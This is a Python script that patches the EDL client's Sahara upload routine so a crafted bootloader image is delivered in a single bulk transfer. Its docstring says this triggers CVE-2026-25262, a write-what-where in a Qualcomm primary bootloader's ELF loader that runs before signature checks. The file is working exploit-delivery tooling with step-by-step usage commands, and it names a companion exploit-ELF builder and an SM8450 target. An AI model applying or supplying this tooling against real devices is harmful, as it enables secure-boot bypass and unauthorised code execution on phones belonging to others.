#!/usr/bin/env python3
"""
CVE-2026-25262 delivery patch for bkerler/edl (V3.6x)
======================================================

Patches `edlclient/Library/sahara.py` -> `sahara.upload_loader()` so that the
whole (crafted) programmer image is sent in ONE bulk transfer in response to
the FIRST SAHARA_READ_DATA / SAHARA_64BIT_MEMORY_READ_DATA request, matching
the publicly confirmed SM8450 exploit delivery ("cve_final_single").

Why: the write-what-where lives in the PBL's ELF loader (PT_LOAD p_paddr is
copied without range checks, before signature rejection). The crafted ELF
built by build_exploit_elf.py carries the malicious destination addresses;
this client-side patch just makes the delivery single-shot, which the public
research found necessary on SM8450. If your PBL desyncs on oversized bulk
transfers, disable single-shot (env var off) -- chunk serving still triggers
the same ELF-parse path after full image receipt.

Usage:
    python apply_single_shot.py "C:\\path\\to\\edl\\edlclient\\Library\\sahara.py"
    python apply_single_shot.py sahara.py --restore

Then run:
    set EDL_SINGLE_SHOT=1
    edl.py --loader crafted.melf <...>      # Windows
    EDL_SINGLE_SHOT=1 edl --loader crafted.melf <...>   # *nix

Idempotent: re-running on an already-patched file is a no-op.
A backup `sahara.py.bak_cve` is created on first patch; --restore uses it.
"""

import sys

MARKER = "EDL_SINGLE_SHOT"

ANCHOR = """\
                        data_offset = pkt.data_offset
                        data_len = pkt.data_len

                        temp_prog = single_programmer_data
"""

REPLACEMENT = """\
                        data_offset = pkt.data_offset
                        data_len = pkt.data_len

                        import os as _os
                        if _os.environ.get("EDL_SINGLE_SHOT"):
                            self.info(f"Exploiting CVE-2026-25262: single-shot "
                                      f"{len(single_programmer_data)} bytes "
                                      f"(device asked off={hex(data_offset)} len={hex(data_len)})")
                            self.cdc.write(single_programmer_data)
                            loop += 1
                            continue

                        temp_prog = single_programmer_data
"""


def main():
    if len(sys.argv) < 2:
        sys.exit(__doc__)
    path = sys.argv[1]
    restore = "--restore" in sys.argv[2:]

    if restore:
        try:
            with open(path + ".bak_cve", "rb") as f:
                bak = f.read()
        except FileNotFoundError:
            sys.exit("[-] no backup found (sahara.py.bak_cve)")
        with open(path, "wb") as f:
            f.write(bak)
        print(f"[+] restored {path} from backup")
        return

    with open(path, "r", encoding="utf-8") as f:
        src = f.read()

    if MARKER in src:
        print("[*] already patched, nothing to do")
        return
    if ANCHOR not in src:
        sys.exit("[-] anchor not found -- edl version mismatch? "
                 "Patch manually inside upload_loader(), non-XML branch, "
                 "right after `data_len = pkt.data_len`.")

    with open(path + ".bak_cve", "w", encoding="utf-8", newline="") as f:
        f.write(src)

    src = src.replace(ANCHOR, REPLACEMENT, 1)
    with open(path, "w", encoding="utf-8", newline="") as f:
        f.write(src)
    print(f"[+] patched {path} (backup: {path}.bak_cve)")
    print("[*] enable with env EDL_SINGLE_SHOT=1")


if __name__ == "__main__":
    main()
